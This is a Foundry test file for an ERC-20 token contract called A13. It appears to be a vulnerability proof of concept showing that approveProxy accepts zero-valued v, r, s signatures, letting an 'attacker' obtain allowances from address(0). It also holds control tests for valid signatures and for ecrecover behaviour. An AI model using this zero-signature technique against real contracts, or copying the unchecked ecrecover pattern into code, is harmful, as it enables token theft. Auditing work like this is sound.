// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {A13} from "src/ERC-20s/A13.sol";

contract A13Test is Test {
    A13 public token;
    address public attacker;

    function setUp() public {
        token = new A13();
        attacker = makeAddr("attacker");
    }

    function test_VulnerabilityProof_ZeroAddressApprovalBypass() public {
        uint256 approvalAmount = 1000000 * 10**18;
        
        // Initial state - no approval
        assertEq(token.allowance(address(0), attacker), 0);
        
        
        uint8 v = 0;  
        bytes32 r = bytes32(0);  
        bytes32 s = bytes32(0);  
        
        console.log("Before exploit:");
        console.log("Allowance from address(0) to attacker:", token.allowance(address(0), attacker));
        
        
        
        vm.prank(attacker);
        bool success = token.approveProxy(
            address(0),      // _from = 0x0
            attacker,        
            approvalAmount,  
            v, r, s          
        );
        
        assertTrue(success);
        assertEq(token.allowance(address(0), attacker), approvalAmount);
        
        console.log("VULNERABILITY PROVEN: Attacker got approval from address(0)!");
        console.log("After exploit:");
        console.log("Allowance from address(0) to attacker:", token.allowance(address(0), attacker));
        console.log("Nonce of address(0) incremented to:", token.nonces(address(0)));
    }

    function test_VulnerabilityProof_MultipleApprovals() public {
        address spender1 = makeAddr("spender1");
        address spender2 = makeAddr("spender2");
        uint256 amount = 500000 * 10**18;
        
    
    uint8 v = 0;
    bytes32 r = bytes32(0);
    bytes32 s = bytes32(0);
        
        
        vm.prank(attacker);
        token.approveProxy(address(0), spender1, amount, v, r, s);
        
        
        vm.prank(attacker);
        token.approveProxy(address(0), spender2, amount, v, r, s);
        
        assertEq(token.allowance(address(0), spender1), amount);
        assertEq(token.allowance(address(0), spender2), amount);
        
        console.log("Multiple approvals from address(0) successful!");
        console.log("Spender1 allowance:", token.allowance(address(0), spender1));
        console.log("Spender2 allowance:", token.allowance(address(0), spender2));
    }

    function test_ValidSignatureStillWorks() public {
        // Test that valid signatures still work normally
        uint256 privateKey = 0x5678;
        address signer = vm.addr(privateKey);
        uint256 approvalAmount = 1000 * 10**18;
        
        bytes32 hash = keccak256(abi.encodePacked(
            signer,
            attacker,
            approvalAmount,
            token.nonces(signer),
            token.name()
        ));
        
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(privateKey, hash);
        
        vm.prank(attacker);
        bool success = token.approveProxy(signer, attacker, approvalAmount, v, r, s);
        
        assertTrue(success);
        assertEq(token.allowance(signer, attacker), approvalAmount);
        
        console.log("Valid signature works correctly");
        console.log("Valid approval amount:", token.allowance(signer, attacker));
    }

    function test_EcrecoverBehaviorWithInvalidParams() public pure {
        
        bytes32 hash = keccak256("test");
        
        
        address result1 = ecrecover(hash, 0, bytes32(0), bytes32(0));
        assertEq(result1, address(0));
        
    
    address result2 = ecrecover(hash, 1, bytes32(uint256(1)), bytes32(uint256(1)));
        assertEq(result2, address(0));
        
        // Case 3: Valid v but invalid r,s combination
        address result3 = ecrecover(hash, 27, bytes32(uint256(1)), bytes32(uint256(1)));
    // Do not assert here: depending on params this may or may not be zero
    console.log("ecrecover with v=27 and random r,s returned:", result3);
    }
}